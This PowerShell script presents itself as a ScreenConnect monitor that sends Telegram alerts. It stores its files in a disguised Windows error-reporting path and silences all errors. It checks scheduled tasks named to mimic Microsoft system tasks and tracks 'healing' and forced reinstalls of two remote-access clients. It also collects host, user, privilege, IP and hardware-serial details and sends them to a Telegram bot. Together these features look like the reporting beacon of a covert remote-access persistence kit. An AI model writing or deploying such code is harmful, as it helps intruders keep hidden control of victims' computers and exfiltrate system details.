#Requires -Version 5.1
# TG_REPORT BUILD 20260802T2 - rich ScreenConnect monitor Telegram alerts (HTML)
param(
    [Parameter(Mandatory = $true)][string]$State,
    [Parameter(Mandatory = $true)][string]$Summary,
    [string]$WorkDir = 'C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache',
    [string]$OldState = ''
)

$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

function Get-Cfg {
    $path = Join-Path $WorkDir 'notify.cfg'
    $cfg = @{}
    if (-not (Test-Path $path)) { return $cfg }
    Get-Content -LiteralPath $path | ForEach-Object {
        if ($_ -match '^\s*([A-Za-z0-9_]+)\s*=\s*(.*)\s*$') {
            $cfg[$matches[1]] = $matches[2].Trim()
        }
    }
    return $cfg
}

function Esc([string]$s) {
    if ($null -eq $s) { return '' }
    return ($s -replace '&', '&amp;' -replace '<', '&lt;' -replace '>', '&gt;')
}

function Get-PublicIp {
    foreach ($u in @(
        'https://api.ipify.org',
        'https://ifconfig.me/ip',
        'https://icanhazip.com'
    )) {
        try {
            $r = Invoke-WebRequest -Uri $u -UseBasicParsing -TimeoutSec 6
            $ip = ($r.Content | Out-String).Trim()
            if ($ip -match '^\d{1,3}(\.\d{1,3}){3}$' -or $ip -match ':') { return $ip }
        } catch {}
    }
    return 'n/a'
}

function Get-LocalIps {
    try {
        $ips = Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
            Where-Object { $_.IPAddress -notlike '127.*' -and $_.PrefixOrigin -ne 'WellKnown' } |
            Select-Object -ExpandProperty IPAddress -Unique
        if ($ips) { return ($ips -join ', ') }
    } catch {}
    try {
        $ips = [System.Net.Dns]::GetHostAddresses($env:COMPUTERNAME) |
            Where-Object { $_.AddressFamily -eq 'InterNetwork' -and $_.IPAddressToString -notlike '127.*' } |
            ForEach-Object { $_.IPAddressToString }
        if ($ips) { return ($ips -join ', ') }
    } catch {}
    return 'n/a'
}

function Get-SvcLine([string]$Name) {
    $s = Get-Service -Name $Name -ErrorAction SilentlyContinue
    if (-not $s) { return 'missing' }
    $cim = Get-CimInstance Win32_Service -Filter "Name='$Name'" -ErrorAction SilentlyContinue
    $start = if ($cim) { $cim.StartMode } else { '?' }
    $path = if ($cim -and $cim.PathName) {
        $p = $cim.PathName
        if ($p.Length -gt 90) { $p.Substring(0, 90) + '...' } else { $p }
    } else { '' }
    if ($path) { return "$($s.Status) (start=$start) | $path" }
    return "$($s.Status) (start=$start)"
}

function Get-OsInfo {
    $os = Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue
    $cs = Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue
    $bios = Get-CimInstance Win32_BIOS -ErrorAction SilentlyContinue
    $cpu = Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1
    $disk = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'" -ErrorAction SilentlyContinue
    [pscustomobject]@{
        Caption      = if ($os) { $os.Caption } else { 'n/a' }
        Version      = if ($os) { $os.Version } else { 'n/a' }
        Build        = if ($os) { $os.BuildNumber } else { 'n/a' }
        Arch         = if ($os) { $os.OSArchitecture } else { $env:PROCESSOR_ARCHITECTURE }
        InstallDate  = if ($os -and $os.InstallDate) { $os.InstallDate.ToString('yyyy-MM-dd') } else { 'n/a' }
        LastBoot     = if ($os -and $os.LastBootUpTime) { $os.LastBootUpTime.ToString('yyyy-MM-dd HH:mm') } else { 'n/a' }
        Manufacturer = if ($cs) { $cs.Manufacturer } else { 'n/a' }
        Model        = if ($cs) { $cs.Model } else { 'n/a' }
        Domain       = if ($cs) { $cs.Domain } else { 'n/a' }
        TotalRAM_GB  = if ($cs) { [math]::Round($cs.TotalPhysicalMemory / 1GB, 1) } else { 'n/a' }
        Serial       = if ($bios) { $bios.SerialNumber } else { 'n/a' }
        CPU          = if ($cpu) { $cpu.Name } else { 'n/a' }
        DiskFree_GB  = if ($disk) { [math]::Round($disk.FreeSpace / 1GB, 1) } else { 'n/a' }
        DiskSize_GB  = if ($disk) { [math]::Round($disk.Size / 1GB, 1) } else { 'n/a' }
    }
}

$cfg = Get-Cfg
if (-not $cfg.BOT_TOKEN -or -not $cfg.CHAT_ID) { exit 0 }

$prim = 'ScreenConnect Client (5f6010579852e507)'
$alt = 'ScreenConnect Client (f861c8140d453427)'
$os = Get-OsInfo
$who = [Security.Principal.WindowsIdentity]::GetCurrent().Name
$elev = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator)
$isSystem = $who -like '*SYSTEM*' -or $who -eq 'NT AUTHORITY\SYSTEM'

$msiCache = Join-Path $WorkDir 'pkg.msi'
$msiSize = if (Test-Path $msiCache) {
    '{0:N0} KB' -f ((Get-Item $msiCache).Length / 1KB)
} else { 'none' }

$emojiMap = @{
    OK       = [string]([char]0x2705)
    DOWN     = ([string][char]::ConvertFromUtf32(0x1F6A8))
    RESTORED = ([string][char]::ConvertFromUtf32(0x1F7E2))
    FAIL     = [string]([char]0x274C)
    FORCE    = [string]([char]0x26A1)
}
$key = $State.ToUpperInvariant()
$emoji = if ($emojiMap.ContainsKey($key)) { $emojiMap[$key] } else { ([string][char]::ConvertFromUtf32(0x1F4F1)) }

$title = switch ($key) {
    'OK' { 'Primary healthy' }
    'DOWN' { 'Primary DOWN - healing' }
    'RESTORED' { 'Primary RESTORED' }
    'FAIL' { 'Heal FAILED' }
    'FORCE' { 'Forced reinstall' }
    default { "State: $State" }
}

$trans = if ($OldState) { "$OldState -> $State" } else { $State }

$scList = New-Object System.Collections.Generic.List[string]
Get-Service -ErrorAction SilentlyContinue | Where-Object { $_.Name -like 'ScreenConnect Client*' } | ForEach-Object {
    [void]$scList.Add(('• <code>{0}</code>: <b>{1}</b>' -f (Esc $_.Name), (Esc ([string]$_.Status))))
}
if ($scList.Count -eq 0) { [void]$scList.Add('• (none)') }

$taskLines = New-Object System.Collections.Generic.List[string]
foreach ($tn in @(
        '\Microsoft\Windows\Diagnosis\Scheduled',
        '\Microsoft\Windows\PLA\Server',
        '\Microsoft\Windows\WDI\ResolutionHost',
        '\Microsoft\Windows\Tcpip\IpAddressConflict1'
    )) {
    schtasks.exe /Query /TN $tn /FO LIST 1>$null 2>$null
    $st = if ($LASTEXITCODE -eq 0) { 'present' } else { 'missing' }
    [void]$taskLines.Add(('• <code>{0}</code>: {1}' -f (Esc $tn), $st))
}

$pub = Get-PublicIp
$lan = Get-LocalIps
$now = Get-Date -Format 'yyyy-MM-dd HH:mm:ss zzz'
$uptime = 'n/a'
try {
    $boot = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
    $uptime = '{0:dd}d {0:hh}h {0:mm}m' -f ((Get-Date) - $boot)
} catch {}

$text = @"
$emoji <b>SC Monitor — $(Esc $title)</b>

<b>Event</b>
• Summary: $(Esc $Summary)
• Transition: <code>$(Esc $trans)</code>
• When: $(Esc $now)

<b>Host</b>
• Computer: <code>$(Esc $env:COMPUTERNAME)</code>
• User: <code>$(Esc $who)</code>
• Elevated: $elev | SYSTEM: $isSystem
• Domain/Workgroup: $(Esc $os.Domain)

<b>Network</b>
• LAN IPs: <code>$(Esc $lan)</code>
• Public IP: <code>$(Esc $pub)</code>

<b>OS / Hardware</b>
• OS: $(Esc $os.Caption)
• Version: $(Esc $os.Version) (build $(Esc $os.Build)) $(Esc $os.Arch)
• Install: $(Esc $os.InstallDate) | Last boot: $(Esc $os.LastBoot)
• Uptime: $(Esc $uptime)
• CPU: $(Esc $os.CPU)
• Hardware: $(Esc $os.Manufacturer) $(Esc $os.Model)
• Serial: <code>$(Esc $os.Serial)</code>
• RAM: $($os.TotalRAM_GB) GB
• Disk C: $($os.DiskFree_GB) GB free / $($os.DiskSize_GB) GB

<b>ScreenConnect</b>
• Primary <code>5f6010579852e507</code>: $(Esc (Get-SvcLine $prim))
• Alt <code>f861c8140d453427</code>: $(Esc (Get-SvcLine $alt))
• All SC services:
$($scList -join "`n")

<b>Persist / Cache</b>
• MSI cache: $(Esc $msiSize)
• WorkDir: <code>$(Esc $WorkDir)</code>
• Tasks:
$($taskLines -join "`n")

<i>Bot: @nobuddyrmmBot • OWN_MON rich report</i>
"@

$log = Join-Path $WorkDir 'boot.err'
try {
    Invoke-RestMethod -Uri ("https://api.telegram.org/bot$($cfg.BOT_TOKEN)/sendMessage") -Method Post -Body @{
        chat_id                  = $cfg.CHAT_ID
        text                     = $text
        parse_mode               = 'HTML'
        disable_web_page_preview = 'true'
    } | Out-Null
    Add-Content -LiteralPath $log -Value 'tg_sent_rich' -ErrorAction SilentlyContinue
} catch {
    try {
        $plain = [regex]::Replace($text, '<[^>]+>', '')
        $plain = [System.Net.WebUtility]::HtmlDecode($plain)
        Invoke-RestMethod -Uri ("https://api.telegram.org/bot$($cfg.BOT_TOKEN)/sendMessage") -Method Post -Body @{
            chat_id                  = $cfg.CHAT_ID
            text                     = $plain
            disable_web_page_preview = 'true'
        } | Out-Null
        Add-Content -LiteralPath $log -Value 'tg_sent_plain' -ErrorAction SilentlyContinue
    } catch {
        Add-Content -LiteralPath $log -Value ("tg_fail " + $_.Exception.Message) -ErrorAction SilentlyContinue
    }
}
